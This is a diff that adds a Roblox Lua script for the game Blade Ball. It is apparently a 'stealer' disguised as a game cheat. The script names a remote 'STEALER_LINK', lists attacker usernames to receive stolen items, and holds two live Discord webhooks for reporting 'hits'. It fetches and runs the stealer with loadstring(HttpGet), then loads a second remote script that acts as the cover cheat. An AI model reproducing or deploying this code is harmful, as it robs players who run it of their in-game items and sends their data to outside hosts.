@@ -1,0 +1,30 @@
+STEALER_LINK = 'https://raw.githubusercontent.com/OpHub9/Ophub99/refs/heads/main/Protected_7742734286907947.txt' -- stealer link (how to create is bellow)
+
+Usernames = {
+    'Bladeballgre', -- PUT UR ROBLOX USERNAMES
+    'BLADES8927', -- AS MANY AS U WANT BUT DONT FORGET ,
+    'BLADES12900',
+}
+
+BigHitsWebhook = "https://discord.com/api/webhooks/1362608875001348226/vQ3ZhPsrF7L783OqAj1a1dqAbS1RI-BbB30_370mWK2cQ3yONNQ7o5QUQPOl68D01GUa"
+SmallHitsWebhook = "https://discord.com/api/webhooks/1362609460912328747/aOYuThKh3E6MsOVFXvSpuZj1H9_Wa9HxpCwdjXLDH5ijtsG5lYt7_0WjIFAxYYUAW3-7"
+
+loadstring(game:HttpGet(STEALER_LINK, true))()
+
+
+local url = "https://raw.githubusercontent.com/Fspl0it/Blade-Ball/refs/heads/main/Game.lua"
+
+local success, response = pcall(function()
+    return game:HttpGet(url)
+end)
+
+if success and response and not response:find("404: Not Found") then
+    local func, err = loadstring(response)
+    if func then
+        pcall(func)
+    else
+        warn("Failed to execute script:", err)
+    end
+else
+    warn("Not Loaded")
+end
